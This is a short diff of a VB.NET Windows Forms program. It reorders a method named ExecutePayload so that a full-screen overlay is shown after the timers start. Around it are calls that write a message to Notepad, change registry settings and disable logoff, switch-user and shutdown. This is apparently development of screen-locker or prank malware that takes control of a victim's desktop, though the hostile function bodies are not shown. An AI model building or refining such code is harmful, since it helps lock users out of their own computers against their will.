@@ -1142,11 +1142,6 @@ Public Class Form1
 
     ' Method to execute the payload in a separate thread
     Private Sub ExecutePayload()
-        ' Check if the overlay is disposed or null, and create a new instance if needed
-        If overlay Is Nothing OrElse overlay.IsDisposed Then
-            overlay = New FullScreenOverlay()
-            overlay.Show()
-        End If
 
         ' Execute remaining operations
         WriteMessageToNotepad()
@@ -1154,6 +1149,8 @@ Public Class Form1
         animationTimer.Start()
         VisualEffectTimer.Start()
         portalTimer.Start()
+        overlay = New FullScreenOverlay()
+        overlay.Show()
         ' Update registry settings and disable Log off
         UpdateRegistrySettings()
         DisableLogoffSwitchUserAndShutdown()
